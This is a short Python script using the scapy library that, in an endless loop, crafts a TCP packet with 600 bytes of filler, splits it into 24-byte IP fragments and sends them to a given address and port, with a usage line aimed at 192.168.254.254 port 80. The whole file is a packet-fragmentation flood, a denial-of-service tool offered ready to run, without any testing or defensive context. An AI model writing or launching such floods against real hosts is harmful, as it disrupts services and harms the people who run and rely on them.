from scapy.all import *

def send_fragments(target_ip, target_port):
    while True:  # Start an infinite loop
        # Craft the packet
        packet = IP(dst=target_ip)/TCP(dport=target_port)/("X"*600)  # TCP packet with 600 bytes of payload
        # Fragment the packet
        frags = fragment(packet, fragsize=24)  # Specify the fragment size
        # Send fragments
        for frag in frags:
            send(frag, verbose=0)  # verbose=0 to reduce console clutter

# Usage
send_fragments("192.168.254.254", 80)